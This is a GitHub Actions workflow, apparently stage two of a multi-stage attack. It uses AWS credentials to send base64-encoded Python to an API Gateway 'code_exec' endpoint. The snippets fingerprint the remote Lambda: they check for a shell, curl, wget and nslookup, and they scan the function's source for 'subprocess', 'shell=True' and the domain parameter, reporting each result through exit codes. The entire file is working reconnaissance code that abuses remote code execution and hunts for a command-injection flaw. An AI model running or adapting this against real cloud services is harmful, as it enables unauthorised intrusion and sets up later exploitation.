name: Stage2-01-Runtime-Fingerprint

on:
  push:
    branches:
      - corgi

permissions:
  contents: read

jobs:
  fingerprint:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec

    steps:
      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Fingerprint Lambda runtime
        run: |
          python3 - <<'PY'
          import os
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          api = os.environ["API_URL"]

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = {
              "opt_aws": r'''
          import os
          raise SystemExit(7 if os.path.exists("/opt/aws") else 9)
          ''',

              "opt_nslookup": r'''
          import os
          raise SystemExit(7 if os.path.exists("/opt/nslookup") else 9)
          ''',

              "bin_sh": r'''
          import os
          raise SystemExit(7 if os.path.exists("/bin/sh") else 9)
          ''',

              "curl": r'''
          import shutil
          raise SystemExit(7 if shutil.which("curl") else 9)
          ''',

              "wget": r'''
          import shutil
          raise SystemExit(7 if shutil.which("wget") else 9)
          ''',

              "lambda_source_markers": r'''
          import os

          path = "/var/task/lambda_function.py"

          if not os.path.exists(path):
              raise SystemExit(9)

          source = open(path, "r", errors="ignore").read()

          markers = [
              "subprocess",
              "shell=True",
              "nslookup",
              "lambda_handler",
              "domain = event.get"
          ]

          matches = sum(marker in source for marker in markers)

          raise SystemExit(20 + matches)
          '''
          }

          for name, code in tests.items():
              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  api,
                  json={"code": encoded},
                  auth=auth,
                  timeout=40
              )

              print(f"TEST={name}")
              print(response.text)
              print("---")
          PY
